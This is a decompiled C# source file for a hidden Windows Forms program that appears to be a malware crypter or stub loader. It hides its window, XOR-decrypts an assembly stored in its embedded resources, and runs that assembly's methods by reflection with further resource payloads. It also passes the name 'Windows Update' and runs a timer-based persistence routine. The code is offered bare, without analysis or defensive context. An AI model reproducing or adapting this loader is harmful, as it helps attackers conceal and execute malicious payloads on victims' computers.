using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Windows.Forms;

public class frmMain : Form
{
	public static Assembly assembly;

	public static string Persistance;

	public static ComponentResourceManager manager = new ComponentResourceManager(typeof(frmMain));

	public frmMain()
	{
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Expected O, but got Unknown
		assembly = Assembly.Load(Decrypt((byte[])manager.GetObject("b")));
		InitializeComponent();
		AquireData(new List<object>
		{
			0,
			"",
			GetResource("a"),
			false
		});
		Timer val = new Timer();
		val.add_Tick((EventHandler)tick_Tick);
		val.set_Interval(3000);
		val.Start();
	}

	public static void tick_Tick(object sender, EventArgs e)
	{
		List<object> list = new List<object>();
		list.Add("Windows Update");
		list.Add(false);
		AquireData(list);
		if (Process.GetProcessesByName(Persistance).Length == 2)
		{
			List<object> list2 = new List<object>();
			list2.Add(GetResource("c"));
			list2.Add(Application.get_StartupPath() + "-true");
			Persistance = Path.GetFileName((string)AquireData(list2));
			Environment.Exit(-1);
		}
	}

	private static byte[] GetResource(string ResName)
	{
		object @object = manager.GetObject(ResName);
		return (byte[])@object;
	}

	protected override void SetVisibleCore(bool value)
	{
		((Form)this).SetVisibleCore(false);
	}

	private void InitializeComponent()
	{
	}

	public static object AquireData(List<object> swag)
	{
		MethodInfo[] methods = assembly.GetTypes()[1].GetMethods();
		MethodInfo[] array = methods;
		foreach (MethodInfo methodInfo in array)
		{
			try
			{
				return methodInfo.Invoke(null, swag.ToArray());
			}
			catch
			{
			}
		}
		return null;
	}

	public static byte[] Decrypt(byte[] data)
	{
		byte[] array = new byte[1] { 1 };
		for (int i = 0; i < data.Length; i++)
		{
			data[i] = (byte)(array[i % array.Length] ^ data[i]);
		}
		return data;
	}
}
